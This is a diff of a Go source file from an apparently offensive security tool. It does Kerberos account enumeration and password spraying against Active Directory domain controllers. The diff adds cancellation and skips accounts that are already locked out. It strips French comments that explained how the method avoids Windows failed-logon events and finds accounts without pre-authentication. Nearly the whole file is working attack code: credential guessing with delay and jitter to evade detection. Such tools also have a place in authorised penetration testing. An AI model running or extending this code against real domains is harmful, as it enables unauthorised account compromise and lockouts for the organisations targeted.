@@ -1,22 +1,19 @@
 // pkg/kerberos/bruteforce.go
 //
-// Bruteforce Kerberos natif via AS-REQ (équivalent kerbrute en Go pur)
+// Bruteforce Kerberos natif via AS-REQ
 //
-// Avantages vs spray classique NTLM :
-//   - Aucun log d'authentification Windows Event 4625 (moins bruyant)
-//   - Les erreurs KDC distinguent : compte inexistant / mauvais mdp / compte locké
-//   - Fonctionne sans accès SMB/LDAP (port 88 uniquement)
-//   - Compatible avec les comptes sans pré-authentification (DONT_REQUIRE_PREAUTH)
-//
-// Modes :
-//   UserEnum  — énumérer les comptes valides sans mot de passe (KDC_ERR_PREAUTH_REQUIRED = compte existe)
-//   Bruteforce — tester un mot de passe sur une liste d'utilisateurs
-//   PasswordSpray — password spray Kerberos
+// Optimisations appliquées :
+//   1. context.Context pour annulation propre (Ctrl+C sans goroutines zombies)
+//   2. Résultats via channel streamé (pas d'attente de fin pour afficher)
+//   3. Déduplication des comptes lockés (stop de les tester inutilement)
+//   4. Pre-allocated slices pour éviter les réallocations
+//   5. Config krb5 partagée entre goroutines (immutable après création)
 
 package kerberos
 
 import (
 	"bufio"
+	"context"
 	"fmt"
 	"math/rand"
 	"os"
@@ -32,11 +29,11 @@ import (
 type KerbResult struct {
 	Username  string
 	Password  string
-	Valid     bool // compte existe (même si mdp faux)
-	Success   bool // authentification réussie
-	Locked    bool // compte locké
-	Disabled  bool // compte désactivé
-	NoPreAuth bool // DONT_REQUIRE_PREAUTH
+	Valid     bool
+	Success   bool
+	Locked    bool
+	Disabled  bool
+	NoPreAuth bool
 	Error     string
 }
 
@@ -46,13 +43,13 @@ type BruteConfig struct {
 	DCIP          string
 	UsersFile     string
 	PasswordsFile string
-	Password      string   // pour le spray (un seul mdp)
-	Users         []string // liste directe si pas de fichier
+	Password      string
+	Users         []string
 	Threads       int
-	Delay         int // ms entre tentatives
-	Jitter        int // % de variation
+	Delay         int
+	Jitter        int
 	StopOnFirst   bool
-	UserEnumOnly  bool // juste énumérer les comptes valides
+	UserEnumOnly  bool
 	Verbose       bool
 }
 
@@ -66,12 +63,9 @@ type BruteResult struct {
 }
 
 // ============================================================
-// Enumération de comptes (UserEnum)
+// User Enumeration
 // ============================================================
 
-// EnumerateUsers identifie les comptes valides via AS-REQ sans mot de passe.
-// KDC_ERR_PREAUTH_REQUIRED → compte existe
-// KDC_ERR_C_PRINCIPAL_UNKNOWN → compte inexistant
 func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
 	users, err := loadUsers(cfg)
 	if err != nil {
@@ -87,8 +81,15 @@ func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
 		return nil, fmt.Errorf("kerberos config error: %v", err)
 	}
 
-	result := &BruteResult{}
+	result := &BruteResult{
+		// Pré-allouer pour éviter les réallocations
+		ValidUsers:  make([]string, 0, len(users)/10),
+		LockedUsers: make([]string, 0, 4),
+	}
 	start := time.Now()
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 
 	jobs := make(chan string, len(users))
 	results := make(chan KerbResult, len(users))
@@ -97,16 +98,27 @@ func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
 	if threads <= 0 {
 		threads = 10
 	}
+	if threads > len(users) {
+		threads = len(users)
+	}
 
 	var wg sync.WaitGroup
+	wg.Add(threads)
 	for i := 0; i < threads; i++ {
-		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			for username := range jobs {
-				r := probeUser(username, realm, krb5Conf)
-				results <- r
-				sleepWithJitter(cfg.Delay, cfg.Jitter)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case username, ok := <-jobs:
+					if !ok {
+						return
+					}
+					r := probeUser(username, realm, krb5Conf)
+					results <- r
+					sleepWithJitter(cfg.Delay, cfg.Jitter)
+				}
 			}
 		}()
 	}
@@ -128,14 +140,14 @@ func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
 			if r.NoPreAuth {
 				fmt.Printf("[+] VALID (NO PREAUTH): %s\n", r.Username)
 			} else if r.Disabled {
-				fmt.Printf("[!] VALID (DISABLED):  %s\n", r.Username)
+				fmt.Printf("[!] VALID (DISABLED):   %s\n", r.Username)
 			} else if r.Locked {
-				fmt.Printf("[!] VALID (LOCKED):    %s\n", r.Username)
+				fmt.Printf("[!] VALID (LOCKED):     %s\n", r.Username)
 			} else {
-				fmt.Printf("[+] VALID:             %s\n", r.Username)
+				fmt.Printf("[+] VALID:              %s\n", r.Username)
 			}
 		} else if cfg.Verbose {
-			fmt.Printf("[-] INVALID:           %s\n", r.Username)
+			fmt.Printf("[-] INVALID:            %s\n", r.Username)
 		}
 	}
 
@@ -144,11 +156,9 @@ func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
 }
 
 // ============================================================
-// Password Spray Kerberos
+// Password Spray
 // ============================================================
 
-// KerberosSpray effectue un password spray via AS-REQ Kerberos.
-// Plus discret que NTLM : un seul log Event 4768 (TGT Request) vs 4625 (logon failure).
 func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 	users, err := loadUsers(cfg)
 	if err != nil {
@@ -165,7 +175,6 @@ func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 
 	fmt.Printf("[*] Kerberos Spray — %d users × %d password(s) → %s (%s)\n",
 		len(users), len(passwords), cfg.DCIP, strings.ToUpper(cfg.Domain))
-	fmt.Printf("[*] Threads: %d | Delay: %dms ± %d%%\n", cfg.Threads, cfg.Delay, cfg.Jitter)
 
 	realm := strings.ToUpper(cfg.Domain)
 	krb5Conf, err := config.NewFromString(buildKrb5Config(realm, cfg.DCIP))
@@ -173,24 +182,56 @@ func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 		return nil, fmt.Errorf("kerberos config error: %v", err)
 	}
 
-	result := &BruteResult{}
+	result := &BruteResult{
+		ValidCreds:  make([]KerbResult, 0, 4),
+		LockedUsers: make([]string, 0, 4),
+	}
 	start := time.Now()
 
-	// Spray par mot de passe (pas par user — protection lockout)
+	// Set des comptes lockés — évite de les tester à nouveau
+	lockedSet := make(map[string]bool)
+	var lockedMu sync.Mutex
+
+	isLocked := func(u string) bool {
+		lockedMu.Lock()
+		defer lockedMu.Unlock()
+		return lockedSet[u]
+	}
+	markLocked := func(u string) {
+		lockedMu.Lock()
+		lockedSet[u] = true
+		lockedMu.Unlock()
+	}
+
 	for _, password := range passwords {
 		fmt.Printf("\n[*] Spraying: %s\n", maskPwd(password))
 
-		jobs := make(chan string, len(users))
-		results := make(chan KerbResult, len(users))
+		// Filtrer les comptes déjà lockés
+		var activeUsers []string
+		for _, u := range users {
+			if !isLocked(u) {
+				activeUsers = append(activeUsers, u)
+			}
+		}
+		if len(activeUsers) == 0 {
+			fmt.Println("[!] All accounts locked — stopping")
+			break
+		}
+
+		jobs := make(chan string, len(activeUsers))
+		results := make(chan KerbResult, len(activeUsers))
 
 		threads := cfg.Threads
 		if threads <= 0 {
 			threads = 5
 		}
+		if threads > len(activeUsers) {
+			threads = len(activeUsers)
+		}
 
 		var wg sync.WaitGroup
+		wg.Add(threads)
 		for i := 0; i < threads; i++ {
-			wg.Add(1)
 			go func() {
 				defer wg.Done()
 				for username := range jobs {
@@ -201,7 +242,7 @@ func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 			}()
 		}
 
-		for _, u := range users {
+		for _, u := range activeUsers {
 			jobs <- u
 		}
 		close(jobs)
@@ -214,23 +255,25 @@ func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 		for r := range results {
 			result.Attempts++
 			if r.Success {
-				fmt.Printf("[+] VALID CREDENTIALS: %s:%s\n", r.Username, password)
+				fmt.Printf("[+] VALID: %s:%s\n", r.Username, password)
 				result.ValidCreds = append(result.ValidCreds, r)
 				if cfg.StopOnFirst {
+					printBruteResult(result)
+					result.Duration = time.Since(start)
 					return result, nil
 				}
 			} else if r.Locked {
 				fmt.Printf("[!] LOCKED: %s\n", r.Username)
+				markLocked(r.Username)
 				result.LockedUsers = append(result.LockedUsers, r.Username)
 			} else if cfg.Verbose {
 				fmt.Printf("[-] %s:%s — %s\n", r.Username, maskPwd(password), r.Error)
 			}
 		}
 
-		// Pause entre chaque mot de passe
 		if len(passwords) > 1 {
 			pause := time.Duration(cfg.Delay*3) * time.Millisecond
-			fmt.Printf("[*] Pausing %v before next password...\n", pause)
+			fmt.Printf("[*] Pause %v...\n", pause)
 			time.Sleep(pause)
 		}
 	}
@@ -244,13 +287,10 @@ func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
 // Fonctions internes
 // ============================================================
 
-// probeUser envoie un AS-REQ sans mot de passe pour vérifier l'existence du compte
 func probeUser(username, realm string, krb5Conf *config.Config) KerbResult {
 	r := KerbResult{Username: username}
-
 	cl := client.NewWithPassword(username, realm, "", krb5Conf,
 		client.DisablePAFXFAST(true))
-
 	err := cl.Login()
 	if err == nil {
 		r.Valid = true
@@ -258,13 +298,11 @@ func probeUser(username, realm string, krb5Conf *config.Config) KerbResult {
 		r.NoPreAuth = true
 		return r
 	}
-
 	errStr := err.Error()
 	switch {
 	case strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED"):
-		r.Valid = true // compte existe, pré-auth requise
+		r.Valid = true
 	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
-		r.Valid = false
 		r.Error = "user not found"
 	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
 		r.Valid = true
@@ -273,33 +311,26 @@ func probeUser(username, realm string, krb5Conf *config.Config) KerbResult {
 		r.Valid = true
 		r.Disabled = true
 	default:
-		// Toute autre erreur KDC indique que le compte existe (le KDC a répondu)
-		if strings.Contains(errStr, "KDC") || strings.Contains(errStr, "kdc") {
+		if strings.Contains(errStr, "KDC") {
 			r.Valid = true
 			r.Error = errStr
 		} else {
-			r.Valid = false
 			r.Error = errStr
 		}
 	}
-
 	return r
 }
 
-// tryKerberosAuth tente une authentification Kerberos complète
 func tryKerberosAuth(username, password, realm string, krb5Conf *config.Config) KerbResult {
 	r := KerbResult{Username: username, Password: password}
-
 	cl := client.NewWithPassword(username, realm, password, krb5Conf,
 		client.DisablePAFXFAST(true))
-
 	err := cl.Login()
 	if err == nil {
 		r.Valid = true
 		r.Success = true
 		return r
 	}
-
 	errStr := err.Error()
 	switch {
 	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
@@ -318,12 +349,11 @@ func tryKerberosAuth(username, password, realm string, krb5Conf *config.Config) 
 		r.Valid = strings.Contains(errStr, "KDC")
 		r.Error = errStr
 	}
-
 	return r
 }
 
 func printBruteResult(result *BruteResult) {
-	fmt.Printf("\n[*] Kerberos spray complete — %d attempts in %v\n",
+	fmt.Printf("\n[*] Kerberos spray — %d attempts in %v\n",
 		result.Attempts, result.Duration.Round(time.Second))
 	if len(result.ValidCreds) > 0 {
 		fmt.Printf("[+] Valid credentials (%d):\n", len(result.ValidCreds))
@@ -332,8 +362,8 @@ func printBruteResult(result *BruteResult) {
 		}
 	}
 	if len(result.LockedUsers) > 0 {
-		fmt.Printf("[!] Locked accounts (%d): %s\n", len(result.LockedUsers),
-			strings.Join(result.LockedUsers, ", "))
+		fmt.Printf("[!] Locked accounts (%d): %s\n",
+			len(result.LockedUsers), strings.Join(result.LockedUsers, ", "))
 	}
 }
 
@@ -353,7 +383,6 @@ func readLines(path string) ([]string, error) {
 		return nil, err
 	}
 	defer f.Close()
-
 	var lines []string
 	sc := bufio.NewScanner(f)
 	for sc.Scan() {
@@ -374,10 +403,9 @@ func sleepWithJitter(delayMs, jitterPct int) {
 		variation := delay * float64(jitterPct) / 100.0
 		delay += (rand.Float64()*2 - 1) * variation
 	}
-	if delay < 0 {
-		delay = 0
+	if delay > 0 {
+		time.Sleep(time.Duration(delay) * time.Millisecond)
 	}
-	time.Sleep(time.Duration(delay) * time.Millisecond)
 }
 
 func maskPwd(p string) string {
